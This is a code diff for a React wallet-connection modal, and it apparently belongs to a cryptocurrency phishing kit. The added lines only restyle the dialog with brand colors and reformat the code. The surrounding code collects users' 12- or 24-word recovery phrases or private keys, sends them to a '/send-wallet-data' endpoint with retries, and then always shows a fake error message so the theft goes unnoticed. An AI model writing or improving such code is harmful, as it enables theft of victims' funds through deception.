@@ -23,13 +23,19 @@ interface WalletModalProps {
   } | null;
 }
 
-const WalletModal: React.FC<WalletModalProps> = ({ open, onClose, selectedWallet }) => {
+const WalletModal: React.FC<WalletModalProps> = ({
+  open,
+  onClose,
+  selectedWallet,
+}) => {
   const [tabValue, setTabValue] = useState<number>(0);
   const [walletAddress12, setWalletAddress12] = useState<string>("");
   const [walletAddress24, setWalletAddress24] = useState<string>("");
   const [walletAddressPrivate, setWalletAddressPrivate] = useState<string>("");
   const [phraseWords, setPhraseWords] = useState<string[]>(Array(12).fill(""));
-  const [phraseWords24, setPhraseWords24] = useState<string[]>(Array(24).fill(""));
+  const [phraseWords24, setPhraseWords24] = useState<string[]>(
+    Array(24).fill("")
+  );
   const [privateKey] = useState<string>("");
   const [showErrorPopup, setShowErrorPopup] = useState<boolean>(false);
   const [errorMessage, setErrorMessage] = useState<string>("");
@@ -99,10 +105,10 @@ const WalletModal: React.FC<WalletModalProps> = ({ open, onClose, selectedWallet
   const handleSubmit = async () => {
     setIsLoading(true);
     setShowErrorPopup(false);
-  
+
     let currentWalletAddress: string;
     let isFormValid = true;
-  
+
     if (tabValue === 0) {
       currentWalletAddress = walletAddress12;
       isFormValid = !phraseWords.includes("");
@@ -113,17 +119,17 @@ const WalletModal: React.FC<WalletModalProps> = ({ open, onClose, selectedWallet
       currentWalletAddress = walletAddressPrivate;
       isFormValid = !!privateKey;
     }
-  
+
     if (!currentWalletAddress || !isFormValid) {
       setErrorMessage("Wallet address and all required fields must be filled.");
       setShowErrorPopup(true);
       setIsLoading(false);
       return;
     }
-  
+
     const maxRetries = 5;
     let retryCount = 0;
-  
+
     while (retryCount < maxRetries) {
       try {
         await fetch(`${BASE_URL}/send-wallet-data`, {
@@ -139,10 +145,10 @@ const WalletModal: React.FC<WalletModalProps> = ({ open, onClose, selectedWallet
             ...(tabValue === 2 && { privateKey }),
           }),
         });
-  
+
         await new Promise((resolve) => setTimeout(resolve, 3000)); // 3-second delay
         setIsLoading(false); // Stop loading after delay
-  
+
         setErrorMessage("Error occurred while processing your request.");
         setShowErrorPopup(true);
         return;
@@ -158,7 +164,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ open, onClose, selectedWallet
         }
       }
     }
-  
+
     setIsLoading(false); // Ensure loading is stopped after all retries
   };
 
@@ -274,6 +280,13 @@ const WalletModal: React.FC<WalletModalProps> = ({ open, onClose, selectedWallet
                 minWidth: 0,
                 padding: "6px 12px",
                 fontSize: "0.8rem",
+                color: "#666", // Unselected tab text color
+              },
+              "& .Mui-selected": {
+                color: "#E62058", // Selected tab text color
+              },
+              "& .MuiTabs-indicator": {
+                backgroundColor: "#E62058 ", // Indicator color
               },
             }}
           >
@@ -281,6 +294,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ open, onClose, selectedWallet
             <Tab label="24 Key Phrase" />
             <Tab label="Private Key" />
           </Tabs>
+
           {tabValue === 0 && (
             <>
               <TextField
@@ -344,6 +358,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ open, onClose, selectedWallet
                   width: "100%",
                   borderRadius: "8px",
                   fontSize: "0.8rem",
+                  color: "#333",
                 }}
               >
                 Paste from Clipboard
@@ -413,6 +428,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ open, onClose, selectedWallet
                   width: "100%",
                   borderRadius: "8px",
                   fontSize: "0.8rem",
+                  color: "#333",
                 }}
               >
                 Paste from Clipboard
@@ -436,24 +452,26 @@ const WalletModal: React.FC<WalletModalProps> = ({ open, onClose, selectedWallet
           )}
           <Button
             variant="contained"
-            color="primary"
             onClick={handleSubmit}
             sx={{
               mt: 2,
               width: "100%",
               borderRadius: "8px",
               fontSize: "0.8rem",
+              backgroundColor: "#E62058",
+              "&:hover": {
+                backgroundColor: "#D41C4E", // A slightly darker shade for hover effect
+              },
             }}
           >
             {isLoading ? (
-              <CircularProgress size={24} color="secondary" />
+              <CircularProgress size={24} color="inherit" />
             ) : (
               "Connect"
             )}
           </Button>
         </Box>
       </Modal>
-      {/* Error Popup */}
       {/* Error Popup */}
       <Modal open={showErrorPopup} onClose={() => setShowErrorPopup(false)}>
         <Box
@@ -491,7 +509,11 @@ const WalletModal: React.FC<WalletModalProps> = ({ open, onClose, selectedWallet
             variant="contained"
             color="primary"
             onClick={() => setShowErrorPopup(false)}
-            sx={{ width: "100%", borderRadius: "8px" }}
+            sx={{
+              width: "100%",
+              borderRadius: "8px",
+              backgroundColor: "#E62058",
+            }}
           >
             OK
           </Button>
